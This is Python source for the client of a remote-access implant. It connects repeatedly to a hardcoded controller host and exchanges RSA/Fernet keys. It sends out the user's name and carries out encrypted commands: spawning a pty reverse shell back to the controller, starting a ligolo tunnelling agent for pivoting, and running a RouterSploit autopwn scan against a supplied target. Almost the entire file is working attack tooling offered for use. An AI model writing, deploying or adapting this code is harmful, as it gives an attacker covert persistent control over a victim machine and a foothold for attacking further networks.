import socket
import rsa
import os
import threading
import subprocess
import shlex
import getpass
import time
from ctypes import *
from cryptography.fernet import Fernet
#from PyQt5.QtWidgets import QApplication, QLabel

class Client:

    def __init__(self):
        self.HOST = "192.168.1.134"
        self.PORT = 7070

        self.rsa_pub = None
        self.rsa_priv = None

        self.crypto_key = None
        self.server_crypto_key = None

        self.t1 = None
        self.process = None
        self.ligolo = None
        pass

    def encrypt_data_rsa(self, data, server_rsa):
        data_encoding = None
        if not (type(data)) == bytes:
            data_encoding = data.encode('ascii')
        else:
            data_encoding = data
        data_encrypted = rsa.encrypt(data_encoding, server_rsa)
        return data_encrypted

    def decrypt_data_rsa(self, data):
        data_decrypt = rsa.decrypt(data, self.rsa_priv)
        decrypt_data = data_decrypt.decode('ascii')
        return decrypt_data

    def encrypt_data_fernet(self, data):
        data_encoding = None
        fernet = Fernet(self.server_crypto_key)
        if not (type(data)) == bytes:
            data_encoding = data.encode('ascii')
        else:
            data_encoding = data
        data_encrypted = fernet.encrypt(data_encoding)
        return data_encrypted
    
    def decrypt_data_fernet(self, data):
        fernet = Fernet(self.crypto_key)
        data_decrypted = fernet.decrypt(data)
        return str(data_decrypted.decode("ascii"))
    
    def rev_shell_generator(self):
        #command = "python3 shell.py {0}".format(self.HOST)
        command = "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{0}\",8080));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'".format(self.HOST)
        command_splited = shlex.split(command)
        self.process = subprocess.Popen(command_splited, start_new_session=True)
        return
    
    def ligolo_connect(self):
        command = "./agent -connect {0}:8800 -ignore-cert".format(self.HOST)
        command_splited = shlex.split(command)
        self.ligolo = subprocess.Popen(command_splited, start_new_session=True)
        return

    def data_handler(self, socket_cliente, server_rsa):
        while True:
            try:
                data = socket_cliente.recv(2048)
                print(data)
                if len(data.decode("ascii")) == 0 or data.decode("ascii") == None:
                    break
                else:
                    pass

                try:
                    data_decrypted = self.decrypt_data_fernet(data)
                except:
                    continue

                data_decrypted = data_decrypted.split()

                if data_decrypted[0] == "quit":
                    try:
                        self.ligolo.terminate()
                        self.ligolo.kill()
                        self.process.terminate()
                        self.process.kill()
                        self.t1.join()
                    except:
                        pass
                    socket_cliente.close()
                    exit()
                elif data_decrypted[0] == "rev_shell":
                    self.t1 = threading.Thread(target=self.rev_shell_generator, args=())
                    self.t1.start()
                    continue

                elif data_decrypted[0] == "close_rev_shell":
                    self.t1.join()
                    self.process.terminate()
                    self.process.kill()
                    continue
                elif data_decrypted[0] == "ligolo":
                    self.ligolo_connect()
                    continue
                elif data_decrypted[0] == "ligolo_close":
                    self.ligolo.terminate()
                    self.ligolo.kill()
                    continue
                elif data_decrypted[0] == "get_hostname":
                    command_result = subprocess.check_output("hostname -I", shell=True)
                    print(command_result)
                    data = self.encrypt_data_fernet(command_result)
                    socket_cliente.send(bytearray(data))
                    continue
                elif data_decrypted[0] == "routersploit":
                    command_result = subprocess.check_output("routersploit -m scanners/autopwn -s target {0}".format(data_decrypted[1]), shell=True)
                    data = self.encrypt_data_fernet(command_result)
                    socket_cliente.send(bytearray(data))
                    continue
                else:
                    continue
                
            except Exception as error:
                print(error)
                socket_cliente.close()
                self.connect_to_server()

    def connect_to_server(self):
        while True:
            socket_cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                socket_cliente.connect((self.HOST, self.PORT))
                print("Conexion establecida con el servidor")
                welcome = "user__"
                socket_cliente.send(welcome.encode("ascii"))
                username_pc = getpass.getuser()
                time.sleep(0.5)

                self.rsa_pub, self.rsa_priv = rsa.newkeys(1024)
                self.crypto_key = Fernet.generate_key()

                socket_cliente.send(username_pc.encode("ascii"))
                socket_cliente.send(self.rsa_pub.save_pkcs1(format='DER'))

                server_rsa_unprocess = socket_cliente.recv(2048)
                server_rsa = rsa.PublicKey.load_pkcs1(server_rsa_unprocess, format='DER')
                print(server_rsa)

                client_key_encrypted = self.encrypt_data_rsa(self.crypto_key, server_rsa)
                socket_cliente.send(bytearray(client_key_encrypted))

                server_crypto_key_encrypted = socket_cliente.recv(2046)
                server_crypto_key_decrypted = self.decrypt_data_rsa(server_crypto_key_encrypted)

                self.server_crypto_key = server_crypto_key_decrypted

                pong_encrypted = self.encrypt_data_fernet("pong")

                socket_cliente.send(bytearray(pong_encrypted))

                self.data_handler(socket_cliente, server_rsa)
                continue

            except(ConnectionRefusedError, TimeoutError):
                print("Intentando conectarse")
                time.sleep(2)
                continue
    
if __name__ == "__main__":
    #app = QApplication([])
    os.system('clear')
    Client().connect_to_server()
